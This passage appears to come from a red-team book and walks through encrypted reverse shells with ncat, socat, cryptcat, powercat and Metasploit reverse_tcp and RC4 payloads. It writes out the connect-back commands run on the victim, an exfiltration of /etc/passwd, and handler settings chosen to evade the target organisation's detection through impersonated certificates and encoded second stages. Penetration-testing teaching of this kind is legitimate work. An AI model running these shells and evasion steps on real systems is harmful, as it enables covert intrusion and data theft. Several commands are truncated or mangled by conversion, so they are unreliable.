Let\'s look at the tcpdump trace for this command:
> ![](media/image289.png)
>
> As you can see in the preceding screenshot, the communication between
> the attacker machine and the victim machine is encrypted! Is there any
> issue with using the default settings of ncat? Yes, there is! The SSL
> certificate in use shows that the certificate was automatically
> generated by ncat. A network administrator can detect the presence of
> ncat on their network by looking at the SSL certificate:
>
> ![](media/image290.jpeg)
>
> To solve this problem, we can use a custom SSL certificate. Let\'s use
> an SSL certificate that we impersonated from
>  (SSL impersonation will be discussed later
> in this chapter):
>
> ![](media/image291.png)**ncat -l 8080 \--ssl -v \--ssl-key
> /Users/Harry/.msf4/loot/20180819233217_default_83.166.16**
>
> When the victim machine tries to connect back to the attacker machine,
> the impersonated SSL certificate from  is
> used:
>
> ![](media/image292.jpeg)
>
> Let\'s check the tcpdump trace for the SSL certificate:
>
> ![](media/image293.jpeg)
>
> Using ncat is good practice, but the best part about this is that it
> is supported by
>
> Windows. So, what if socat is installed on the target server instead
> of ncat? No problem!
# Encrypted reverse shell using socat
> socat is a utility tool, just like netcat, that supports communication
> using different protocols as well as through files, pipes, and sockets
> with forking, logging, and dumping for interprocess communication. In
> short, this tool can be described as **Damn Innovative**!
>
> We can check whether or not socat is installed on the target server
> using the following command:
>
> **which socat**
>
> ![](media/image294.jpeg)
Let\'s start the encrypted listener on port 8000 using the following
command on the attacker machine:
> **openssl s_server -quiet -key key.pem -cert cert.pem -port 8000**
>
> ![](media/image295.jpeg)
>
> Execute the following command on the victim machine for a reverse
> shell connection:
>
> ![](media/image296.jpeg)**socat exec:\'bash
> -li\',pty,stderr,setsid,sigint,sane
> openssl-connect:192.168.2.6:8000,key**
>
> Upon successful execution, a reverse shell will be popped on the
> attacker machine:
>
> ![](media/image297.jpeg)
Let\'s try to execute the id command:
> ![](media/image298.jpeg)
As we can see in the following screenshot, the output is encrypted:
> ![](media/image299.jpeg)
>
> If we don\'t want to use SSL at all, we can always try cryptcat. This
> supports encrypted communication using the twofish cipher algorithm.
# Encrypted reverse shell using cryptcat
> cryptcat is a tool based on netcat that is enhanced by twofish
> encryption. Download the tool from 
> and untar it. The following file resides in the cryptcat directory
> after downloading it:
>
> ![](media/image300.jpeg)
>
> We need to build the package using the following command:
>
> **make linux**
>
> ![](media/image301.jpeg)
A binary file named cryptcat will be generated in the same directory, as
follows:
> ![](media/image302.jpeg)
>
> Let\'s execute this file using the following command, which allows us
> to check the help screen:
>
> **./cryptcat -h**
>
> ![](media/image303.jpeg)
>
> This is the same output that netcat would generate with only one more
> option added to it; that is, the -k option. This will be the shared
> secret for twofish encryption.
Let\'s start the listener on the attacker machine with the shared secret
set to
> harry123 through the following command:
>
> ![](media/image304.jpeg)**./cryptcat -lvp 8000 -k \"harry123\"**
>
> Our listener is ready for incoming connections. Now let\'s execute the
> following command on the victim machine:
>
> **rm -rf /tmp/a; mkfifo /tmp/a; ./cryptcat 192.168.2.14 8000 -k
> \"harry123\" 0\ *cryptcat needs to be delivered to the target server for execution.*
Upon successful execution, a reverse shell will be popped on the
attacker machine. Let\'s execute the id and uname -a commands here:
> ![](media/image306.jpeg)
>
> On the tcpdump trace Terminal, we can see that the communication is
> encrypted:
>
> ![](media/image307.jpeg)
>
> Let\'s execute the cat /etc/passwd command to retrieve the passwd file
> in Linux:
>
> ![](media/image308.jpeg)
>
> Congratulations! We have just exfiltrated the linux passwd file using
> a secure communication channel. Data exfiltration will be covered in
> further chapters.
>
> ![](media/image309.jpeg)
>
> ![](media/image60.png)*For Windows users: if you are unable to run
> ncat.exe, nc.exe or cryptcat on Windows, you can always try powercat.
> However, this does not support encryption.*
# Reverse shell using powercat
> powercat is a utility tool that is just like netcat but written in
> PowerShell with some extra features, including the ability to send
> data over TCP, UDP, and DNS, connection relays, and payload
> generation.
>
> powercat can be downloaded from
> .
>
> To make a start with powercat, we need to import the powercat.ps1
> module into PowerShell. (Luckily, I have installed PowerShell on my
> macOS). We can only see the powercat command after we import the
> module:
>
> ![](media/image310.jpeg)
>
> Let\'s execute the following command in order to bring up the help
> screen:
>
> **powercat -h**
>
> ![](media/image311.jpeg)
From here onwards, we can use this module just like a normal netcat.
> Why should you stick with a simple command reverse shell when you can
> do so much more? Without the great Metasploit, a reverse shell is no
> fun at all! Let\'s use Metasploit payloads to get reverse shells, and
> we will then go into more detail with this so that we can use the
> payloads carefully.
>
> Metasploit can be used to generate different reverse shell connection
> payloads. The most common of these is the reverse_tcp payload.
# reverse_tcp
> A Windows-based reverse_tcp payload can be generated using the
> following command:
>
> ![](media/image312.jpeg)**msfvenom -p windows/meterpreter/reverse_tcp
> lhost=\ **use exploit/multi/handler**
>
> **set payload windows/meterpreter/reverse_tcp**
>
> **set lhost \**
>
> **set lport \**
>
> **set exitonsession false \ exit once the reverse run \ this job\>**
>
> ![](media/image313.jpeg)
The listener is started on the attacker machine. Let\'s execute the
payload on the target server:
> ![](media/image314.jpeg)
>
> Upon execution, as we can see, the target server connects back to port
> 1337 using its local port 49275:
>
> ![](media/image315.jpeg)
>
> Our handler just got a connection request from the target server and
> now it continues by sending the second stage payload to the server. If
> everything goes well, you\'ll see a Meterpreter session opened
> message, as shown in the following
>
> screenshot:
>
> ![](media/image316.jpeg)
>
> ![](media/image317.jpeg)We may now be thinking, we got the reverse
> shell! We\'re 31337 (elite) hackers! We did it! However, this is
> wrong. By doing this, we have just alerted the organization of our
> little trick. Take a good look at the following screenshot, which
> shows that the second stage delivered to the target server was an
> executable PE file (DLL):
>
> When the payload (stager in our case) is executed on the target
> server, a second stage request is made to the handler. The handler
> will blindly send the DLL
>
> (second stage) to the target server, which can easily be detected by
> an organization based on a few things that are sent over plain text:
>
> The PE executable header (MZ)
>
> The This program cannot be run in DOS mode string
>
> The metsrv.dll string and other strings that are the supported
> functions by
>
> metsrv
>
> **What is metsrv?**
>
> In order to understand metsrv, you first need to understand how
> meterpreter sessions are obtained. The following points describe the
> process that takes place when opening a valid meterpreter session:
1.  The handler listens for incoming connection on a given IP and port.
2.  The stager (meterpreter payload) is executed on the target server.
3.  The handler receives a new connection from the stager.
4.  A connection is established back to the handler on the given IP and
    > port by the stager.
5.  The handler generates the stage (metsrv.dll) followed by the
    > configuration block and sends a 4-byte block that represents the
    > size of stage.
6.  The stager reads these 4-byte sent by the handler and allocates a
    > block of memory with **readable, writable, and executable**
    > (**RWX**) permission so that metsrv can be written to the
    > allocated block of memory.
7.  The handler sends the payload to the stager (this is where you see
    > Sending stage (XXX bytes) to X.X.X.X).
8.  The stager then reads the stage (metsrv.dll) coming from the handler
    > and writes it to the allocated block of memory.
9.  The stager then passes execution flow to the beginning of
    > metsrv.dll.
10. metsrv patches the DOS header by loading itself into the memory
    > using the reflective DLL injection.
11. metsrv calculates the offset to the session configuration block
    > (this block contains the meterpreter configuration) and patches it
    > so that metsrv.dll can use the socket that was already in use by
    > the stager to connect back to the handler.
12. metsrv, which was just loaded into the memory using reflective DLL
    > injection, executes the dllmain() function and passes the
    > execution flow to the configuration block so as to take control
    > over the communication.
13. metsrv is responsible for SSL negotiation on the socket (encrypted
    > communication). This is why, even after we get a reverse_tcp
    > connection, the communication is encrypted by default. metsrv
    > starts SSL negotiation with the handler for encrypted
    > communication.
14. The handler waits for a valid meterpreter session to be opened. A
    > valid meterpreter session is only valid if the following things
    > are true:
> The SSL negotiation with metsrv was successful
>
> Queries for basic system information were successfully retrieved Basic
> meterpreter modules, such as stdapi, priv, and so on were successfully
> loaded and if they were not loaded, the handler loaded these modules
While sending metsrv.dll to the stager, the payload is not encrypted.
This is why an organization can detect it easily:
> ![](media/image318.jpeg)
>
> However, there is a way to hide the *This program cannot be run in DOS
> mode* and metsrv.dll strings so that the target organization cannot
> detect us. We can either use the payload that offers encryption or we
> can encode the second stage with any encoder of our liking. The latter
> option can be achieved by using the following commands: **set
> enablestageencoding true set stageencoder x86/shikata_ga_nai**
>
> ![](media/image319.jpeg)
>
> This is assuming that the settings for the handler are as described in
> the following screenshot:
>
> ![](media/image320.jpeg)
>
> ![](media/image321.jpeg)The handler will first encode the second stage
> using the x86/shikata_ga_nai built-in encoder in msf and send it to
> the target server:
>
> As we can see in the following screenshot, the encoded second stage
> does not have any of the aforementioned strings, which the target
> organization can detect our presence from:
>
> ![](media/image322.jpeg)
>
> An alternative method to achieve this is by using a payload that
> offers encryption. To do this, enter reverse tcp RC4!
# reverse_tcp_rc4
> This Metasploit payload is a reverse meterpreter payload that has the
> same functionality as reverse_tcp with only one difference: the stage
> in this payload is encrypted with RC4 encryption before sending it to
> the target server. We can use the following commands to generate a
> reverse_tcp payload with RC4 encryption support: **use payload
> windows/meterpreter/reverse_tcp_rc4 set lhost \ reverse connection on\> set lport \ shell connection\> set rc4password \ generate -t exe -f
> \**
>
> ![](media/image323.jpeg)
>
> In this scenario, we used BabaBabaBlackSheep as the RC4 password. Note
> that only the second stage will be encrypted using RC4 encryption and
> not the stager. The stager for reverse_tcp_rc4 is similar to
> reverse_tcp:
>
> ![](media/image324.jpeg)
>
> The handler should also have the same rc4 password so that the handler
> can encrypt the second stage with RC4 encryption. The commands for
> setting up the handler are as follows: **use exploit/multi/handler set
> lhost \ set lport \ to listen for reverse shell connection\> set payload
> windows/meterpreter/reverse_tcp_rc4 set rc4password \ set
> exitonsession false run -j**
>
> ![](media/image325.jpeg)
>
> As we can see in the following screenshot, the handler is up and
> running and waiting for the stage request from the stager. When the
> stager is executed, we can see the meterpreter session popping up:
>
> ![](media/image326.jpeg)
The encrypted second stage looks like this:
> ![](media/image327.jpeg)
>
> But what if the RC4 password is wrong? What will happen to the stager
> executed on the target system?
To find the answers to these questions, let\'s set up a handler with an
incorrect RC4 password. In this case, we used ThisIsAWrongPassword as a
password for RC4 encryption:
> ![](media/image328.jpeg)
When the stager is executed, the RC4 encrypted second stage is sent to
the target server, and this shows that a meterpreter popped up on the
handler. However,
![](media/image329.jpeg)this session will not work because the stager
failed to decrypt the second stage in the memory:
> Let\'s execute the following command to look for the session
> information:
>
> **sessions -l**
>
> ![](media/image330.jpeg)
There\'s something weird about this result; there\'s no information
retrieved from the target server. Let\'s try to interact with the
session using the following command: **sessions -i 3**
> ![](media/image331.jpeg)
>
> When we tried to execute the getuid, getpid, and sysinfo meterpreter